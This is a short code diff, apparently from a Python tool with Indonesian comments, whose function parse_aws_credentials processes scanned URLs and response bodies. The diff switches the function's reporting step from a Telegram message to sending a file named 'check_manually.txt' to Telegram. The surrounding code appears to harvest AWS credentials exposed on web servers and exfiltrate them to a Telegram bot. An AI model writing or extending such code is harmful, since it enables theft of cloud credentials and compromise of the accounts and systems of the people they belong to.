@@ -68,7 +68,8 @@ def parse_aws_credentials(url: str, response_body: str) -> None:
             #check manually!
             {url}
             """
-        response = send_telegram_message(message)
+        #response = send_telegram_message(message)
+        response = send_telegram_file("check_manually.txt")
             # Cek hasil pengiriman
         if response.status_code == 200:
             print('Berhasil mengirim Result Ke telegram')
